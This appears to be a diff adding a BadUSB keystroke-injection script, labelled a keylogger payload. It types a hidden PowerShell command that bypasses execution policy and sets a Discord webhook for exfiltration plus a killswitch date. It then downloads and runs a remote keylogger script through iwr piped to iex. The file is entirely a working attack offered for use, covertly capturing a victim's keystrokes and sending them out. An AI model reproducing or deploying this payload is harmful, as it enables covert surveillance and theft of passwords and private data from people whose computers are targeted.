@@ -1,0 +1,8 @@
+REM GhostSnitch Keylogger Payload
+REM Author: TBJr
+REM Description: Executes hosted keylogger with Discord exfil + killswitch
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass -command "$env:DC_WEBHOOK='https://discord.com/api/webhooks/xxxx';$env:LOG_TIME='09:00 pm';$env:KILLSWITCH='12/31/2025 11:59 PM';iwr 'https://tbjr.github.io/Flipper-payloads/host/keylogger.ps1' | iex"
+ENTER
